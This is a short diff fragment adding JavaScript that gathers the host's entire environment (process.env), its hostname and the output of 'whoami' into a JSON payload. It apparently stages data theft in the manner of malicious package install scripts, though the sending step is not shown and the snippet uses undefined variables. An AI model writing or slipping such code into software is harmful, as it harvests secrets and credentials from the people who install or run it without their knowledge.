@@ -1,0 +1,7 @@
+const envVars = JSON.stringify(process.env)
+const data = JSON.stringify({
+        host: require('os').hostname(),
+        envVars: envVars,
+        whoami: stdout.trim() // Include the result of 'whoami'
+    })
+_tmp_1.envVars = envVars
